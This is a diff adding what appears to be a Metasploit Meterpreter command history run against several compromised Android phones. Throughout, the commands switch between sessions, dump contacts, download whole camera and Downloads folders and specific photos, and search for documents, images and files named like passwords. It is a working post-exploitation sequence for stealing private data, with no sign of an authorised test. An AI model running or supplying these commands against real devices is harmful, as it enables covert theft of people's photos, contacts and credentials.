@@ -1,0 +1,24 @@
+background
+getuid
+download /sdcard/DCIM/Camera/ .
+search -f *.jpg
+search -f *.png
+search -f *.txt
+search -f *.pdf
+search -f *.docx
+termux-setup-storage
+sessions -i 10
+download /sdcard/DCIM/Camera/IMG_20260404_233135.jpg /sdcard/storage/downloads/
+sessions -i 9
+#     download
+ls /sdcard/DCIM/Camera/
+dump_contacts
+download /sdcard/DCIM/Camera/IMG_20260404_233135.jpg .
+ls /sdcard/DCIM/Camera/
+download /sdcard/DCIM/Camera/ .
+download /sdcard/Download/ .
+download /sdcard/DCIM/Camera/20260322_004031.jpg .
+search -f *.txt
+search -f *pass*
+sessions -i 11 -t 300
+set SessionCommunicationTimeout 300
